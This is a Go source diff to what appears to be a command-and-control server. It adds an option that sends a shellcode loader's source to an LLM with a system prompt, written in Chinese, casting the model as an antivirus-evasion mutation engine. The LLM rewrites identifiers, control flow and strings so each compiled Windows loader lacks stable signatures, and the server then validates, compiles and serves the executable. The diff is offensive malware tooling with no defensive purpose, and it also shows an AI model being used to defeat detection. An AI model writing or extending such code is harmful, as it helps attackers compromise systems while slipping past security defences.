@@ -12,6 +12,7 @@ import (
 	"context"
 	"crypto/rand"
 	"embed"
+	"log"
 	"encoding/binary"
 	"fmt"
 	"net/http"
@@ -43,7 +44,9 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	var b struct {
 		ListenerID string `json:"listener_id"`
 		Technique  string `json:"technique"`
-		Server     string `json:"server"` // 可选：回连地址覆盖
+		Server     string `json:"server"`    // 可选：回连地址覆盖
+		AIPoly     bool   `json:"ai_poly"`   // AI 源码级多态变形（LLM 语义保持改写+编译验证）
+		LLMProfile int64  `json:"llm_profile"`
 	}
 	if err := decodeJSON(r, &b); err != nil {
 		writeErr(w, 400, "bad json: "+err.Error())
@@ -87,6 +90,64 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	if b.Technique == "t0_drop" {
 		src = strings.ReplaceAll(src, "beacon.exe", randDropName())
 	}
+	// ③' AI 源码级多态变形（可选）：LLM 语义保持改写 → 编译验证 → 失败重试一次
+	aiApplied := false
+	if b.AIPoly {
+		const aiSys = `你是 Go 免杀加载器源码变形引擎。对用户给出的 Go 源码【骨架】（已抽走 _ipv4Data 数据块，占位为 var _ipv4Data = []string{ /*DATA*/ }）做【语义保持】的免杀变形，使每次编译产物无稳定代码特征。规则：
+1. 重命名全部自定义标识符（变量/函数/类型）为语义无关的随机名（保持长度相近）。
+2. 等价控制流变换：if/else 换位取反、for 改写、插入少量无副作用哑代码。
+3. 字符串字面量改为运行时拼接/字节切片转换（不得改变最终值，尤其 API 名与 DLL 名必须逐字符等价）。
+4. 调整函数定义顺序、加一个不被调用的无害函数。
+5. 【绝对保留原样，逐字节不动】：package/import 列表；包含 GOKEEP_DATA_PLACEHOLDER_UNTOUCHED 的那一行（这是数据占位符，必须原样保留在输出中且仅出现一次，严禁重命名/删除/移动/拆分它）；所有 Windows API 名/DLL 名逐字符；main 对 _ipv4Data 的引用方式。
+6. 输出【完整可编译】的单个 Go 源文件，无解释无围栏。`
+		// 数据块抽走：LLM 只看代码骨架（~15KB），_ipv4Data（数十 MB）不进上下文
+		reData := regexp.MustCompile(`(?s)(var _ipv4Data = \[\]string\{).*?(\n\})`)
+		m := reData.FindStringSubmatchIndex(src)
+		if m == nil {
+			log.Printf("[evasion] AI 变形：未定位到 _ipv4Data 块，跳过")
+		} else {
+			dataBlock := src[m[0]:m[1]] // 原始数据块（var 行…收尾 }），拼回用
+			// 抽走数据块：骨架里无声明（LLM 会删哨兵——实测 qwen flash 不可靠），
+			// 但它每次都保留 main 里 _ipv4Data 的引用；拼回时把声明插到 func main() 之前。
+			skeleton := src[:m[0]] + src[m[1]:]
+			log.Printf("[evasion] AI 骨架 %d bytes（数据块已抽走）", len(skeleton))
+			for attempt := 1; attempt <= 2 && !aiApplied; attempt++ {
+				mutated, err := s.llmGenerate(r.Context(), b.LLMProfile, aiSys, skeleton, 16000)
+				if err != nil {
+					log.Printf("[evasion] AI 变形第 %d 次生成失败: %v", attempt, err)
+					break
+				}
+				// 数据块拼回：占位行换回完整数据
+				if strings.Count(mutated, "_ipv4Data") < 1 {
+					// 调试：落盘 LLM 返回与期望骨架，诊断占位符丢失形态
+					_ = os.WriteFile(filepath.Join(workRoot, "evasion-build", fmt.Sprintf("ai_mut_%d.log", attempt)), []byte(mutated), 0o644)
+					_ = os.WriteFile(filepath.Join(workRoot, "evasion-build", fmt.Sprintf("ai_sk_%d.log", attempt)), []byte(skeleton), 0o644)
+					log.Printf("[evasion] AI 变形第 %d 次产物校验不过（占位符丢失/重复），返回 %d bytes，已落盘诊断", attempt, len(mutated))
+					continue
+				}
+				// 数据块声明插到 func main() 之前（LLM 保留引用但不保留声明——实测一致）
+				insAt := strings.Index(mutated, "func main()")
+				if insAt < 0 {
+					log.Printf("[evasion] AI 变形第 %d 次产物无 func main()，弃", attempt)
+					continue
+				}
+				mut := mutated[:insAt] + dataBlock + "\n" + mutated[insAt:]
+				if !aiMutationSane(mut) {
+					log.Printf("[evasion] AI 变形第 %d 次产物校验不过（关键锚点缺失），重试", attempt)
+					continue
+				}
+				if _, err := buildEvasionLoader(r.Context(), mut); err != nil {
+					log.Printf("[evasion] AI 变形第 %d 次编译失败，重试: %.120v", attempt, err)
+					continue
+				}
+				src = mut
+				aiApplied = true
+			}
+		}
+		if !aiApplied {
+			log.Printf("[evasion] AI 变形未成功，回退确定性模板（密钥仍随机）")
+		}
+	}
 	// ③ 交叉编译（windows/amd64）
 	exe, err := buildEvasionLoader(r.Context(), src)
 	if err != nil {
@@ -96,7 +157,29 @@ func (s *Server) c2LoaderGenerateAPI(w http.ResponseWriter, r *http.Request) {
 	name := fmt.Sprintf("loader_%s_%d.exe", b.Technique, time.Now().Unix())
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="%s"`, name))
+	if b.AIPoly {
+		w.Header().Set("X-AI-Polymorphic", fmt.Sprintf("%v", aiApplied)) // true=AI变形版
+	}
 	_, _ = w.Write(exe)
+}
+
+// aiMutationSane AI 变形产物的基本锚点校验（防 LLM 丢关键结构）。
+func aiMutationSane(src string) bool {
+	if len(src) < 2000 {
+		return false
+	}
+	// 只校验功能锚点：main 与数据源引用（_ipv4Data——拼回的数据块声明依赖它）。
+	// _xorKey1/2 是模板内部名，LLM 重命名属预期变形（编译验证兜底正确性）。
+	for _, anchor := range []string{"func main()", "_ipv4Data"} {
+		if !strings.Contains(src, anchor) {
+			return false
+		}
+	}
+	// t0 有裁尾锚点；其他技术不含也放行
+	if strings.Count(src, "func ") < 4 { // 变形后应仍有多个函数
+		return false
+	}
+	return true
 }
 
 // renderEvasionLoader 把 PIC shellcode 注入 loader 模板：
@@ -268,7 +351,7 @@ func buildEvasionLoader(ctx context.Context, loaderSrc string) ([]byte, error) {
 		tcancel()
 	}
 
-	c, cancel := context.WithTimeout(ctx, 4*time.Minute)
+	c, cancel := context.WithTimeout(ctx, 8*time.Minute)
 	defer cancel()
 	env := append(os.Environ(),
 		"PATH=/usr/local/go/bin:"+os.Getenv("PATH"),
